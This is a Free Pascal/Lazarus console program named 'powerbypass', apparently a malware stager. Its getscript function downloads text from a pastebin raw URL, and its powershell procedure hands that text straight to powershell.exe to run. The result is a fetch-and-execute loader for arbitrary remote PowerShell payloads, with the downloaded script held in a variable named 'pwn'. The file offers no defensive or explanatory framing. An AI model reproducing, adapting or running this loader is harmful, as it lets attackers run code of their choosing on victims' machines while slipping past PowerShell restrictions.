#need Lazarus ID Free Pascal FPC 2.4 or above 

program project1;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,FPHTTPClient,process,CustApp;

type

  { powerbypass }

  powerbypass = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure powershell;virtual;
  end;                               


{ powerbypass }


function getscript:string;
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.Get('http://pastebin.com/raw/HpRahZSG'); // test URL, real one is HTTPS
   getscript := Resultget;
   writeln(getscript);
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;

end;
procedure powerbypass.powershell;
var
  process:Tprocess;
  pwn:string;
  begin
  pwn :=getscript;
  process := Tprocess.create(nil);
  process.executable :='powershell.exe';
  process.parameters.add(trim(pwn));
  try
  process.execute;
  finally
    process.free;
  end;



  end;

procedure powerbypass.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h', 'help');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  { add your program here }
   powershell;
  // stop program loop
  Terminate;
end;

constructor powerbypass.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor powerbypass.Destroy;
begin
  inherited Destroy;
end;

procedure powerbypass.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');
end;

var
  Application: powerbypass;
begin
  Application:=powerbypass.Create(nil);
  Application.Title:='My Application';
  Application.Run;
  Application.Free;
end.
